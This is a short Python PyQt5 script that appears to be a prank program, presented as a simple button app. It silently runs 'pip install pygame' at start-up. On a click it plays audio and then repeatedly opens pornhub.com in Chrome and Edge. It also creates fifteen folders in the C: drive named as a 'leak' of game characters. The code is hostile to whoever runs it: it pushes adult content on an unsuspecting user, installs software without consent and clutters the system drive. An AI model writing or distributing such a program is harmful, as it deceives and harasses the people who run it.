from PyQt5 import QtCore, QtGui, QtWidgets
from uum import *
import sys
import os
os.system('pip install pygame')
from pygame import mixer


#app
app = QtWidgets.QApplication(sys.argv)

#app2
Form = QtWidgets.QWidget()
ui = Ui_Form()
ui.setupUi(Form)
Form.show()

#logic

def play():
    mixer.init()
    mixer.music.load('pyqt5\\dist\\build\\pkg\\welcome.mp3')
    mixer.music.set_volume(1)
    mixer.music.queue('pyqt5\\dist\\build\\pkg\\music.mp3')
    mixer.music.play()
    os.system('start chrome https://www.youtube.com/watch?v=hSQqxaZIs0k')
    os.system('start chrome https://pornhub.com')
    os.system('start msedge https://pornhub.com')
    os.system('start chrome https://pornhub.com')
    os.system('start msedge https://pornhub.com')
    os.mkdir('C:\Слив Кольта и Шелли')
    os.mkdir('C:\Слив Кольта и Шелли 1')
    os.mkdir('C:\Слив Кольта и Шелли 2')
    os.mkdir('C:\Слив Кольта и Шелли 3')
    os.mkdir('C:\Слив Кольта и Шелли 4')
    os.mkdir('C:\Слив Кольта и Шелли 5')
    os.mkdir('C:\Слив Кольта и Шелли 6')
    os.mkdir('C:\Слив Кольта и Шелли 7')
    os.mkdir('C:\Слив Кольта и Шелли 8')
    os.mkdir('C:\Слив Кольта и Шелли 9')
    os.mkdir('C:\Слив Кольта и Шелли 10')
    os.mkdir('C:\Слив Кольта и Шелли 11')
    os.mkdir('C:\Слив Кольта и Шелли 12')
    os.mkdir('C:\Слив Кольта и Шелли 13')
    os.mkdir('C:\Слив Кольта и Шелли 14')

#logic2

ui.pushButton.clicked.connect( play )

#exit
sys.exit(app.exec_())
